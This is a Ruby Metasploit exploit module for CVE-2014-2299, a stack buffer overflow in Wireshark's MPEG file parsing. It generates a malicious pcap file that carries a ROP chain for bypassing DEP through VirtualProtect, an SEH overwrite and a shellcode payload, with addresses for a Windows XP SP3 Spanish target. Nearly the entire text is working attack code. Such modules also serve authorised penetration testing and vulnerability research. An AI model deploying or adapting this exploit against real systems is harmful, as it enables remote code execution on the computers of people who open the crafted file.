#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wireshark <= 1.8.12/1.10.5 wiretap/mpeg.c Stack Buffer Overflow (remote) PoC',
      'Description'    => %q{
          This module triggers a stack buffer overflow in Wireshark <= 1.8.12/1.10.5
          generating a malicious pcap filet.)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Wesley Neelen', # Discovery vulnerability
          'j0sm1',  # Exploit and msf module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-2299'],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=9843' ],
          [ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2014-04.html' ],
          [ 'URL', 'http://www.securityfocus.com/bid/66066/info' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'BadChars'    => "\xff\x00",
          'Space'       => 600,
          'DisableNops' => 'True',
          'PrependEncoder' => "\x81\xec\xc8\x00\x00\x00" # sub esp,200 
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'WinXP SP3 Spanish (bypass DEP)',
            {
              'OffSet' => 70692,
              'Ret'    => 0x1c077cc3, # pop/pop/ret -> krb5_32.dll module 
              'jmpesp' => 0x68e2bfb9,
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar 20 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'pcap file',  'mpeg_overflow.pcap']),
      ], self.class)
  end

  def junk
    return rand_text(4).unpack("L")[0].to_i
  end
  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x78b41ccb,  # POP EAX # RETN [MSVCR100.dll] 
      0x62d9027c,  # ptr to &VirtualProtect() [IAT libcares-2.dll]
      0x61970969,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [libgtk-win32-2.0-0.dll] 
      0x68605980,  # XCHG EAX,ESI # RETN [libglib-2.0-0.dll] 
      0x64f94ba1,  # POP EBP # RETN [libfontconfig-1.dll] 
      0x63cd04f1,  # & push esp # ret  [liblzma-5.dll]
      0x6d4c331b,  # POP EBX # RETN [libpangocairo-1.0-0.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x78aa3bfb,  # POP EDX # RETN [MSVCR100.dll] 
      0x00000040,  # 0x00000040-> edx
      0x78b29eda,  # POP ECX # RETN [MSVCR100.dll] 
      0x668242b9,  # &Writable location [libgnutls-26.dll]
      0x70f67579,  # POP EDI # RETN [libxml2-2.dll] 
      0x63a528c2,  # RETN (ROP NOP) [libgobject-2.0-0.dll]
      0x6d5f8297,  # POP EAX # RETN [libgio-2.0-0.dll] 
      0x90909090,  # nop
      0x6536979d,  # PUSHAD # RETN [libpixman-1-0.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end

  def exploit

    print_status("Creating '#{datastore['FILENAME']}' file ...")
    magic_header = "\xff\xfb"      							# mpeg magic_number
    packet =   pattern_create(892)
    ropchain = create_rop_chain
    packet << ropchain
    packet << payload.encoded      							# Shellcode
    packet << pattern_create(target['OffSet'] - 892 - ropchain.length - payload.encoded.length)
    # SEH pointers overwrite (nseh & seh) 
    packet << "\x90\x90\x90\x90" # nseh
    # 0xff is badchar then we can't make a jump back with jmp $-2000
    # After nseh and seh we haven't space, then we have to jump to another location.
    # 0x6b805955 :  # ADD ESP,86C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libjpeg-8.dll] **   |   {PAGE_EXECUTE_REA
    packet << "\x55\x59\x80\x6b" # seh -> ADD ESP,offset # RETN 
    print_status("Preparing payload")
    filecontent = magic_header
    filecontent << packet
    print_status("Writing payload to file, " + filecontent.length.to_s()+" bytes")
    file_create(filecontent)

  end
end
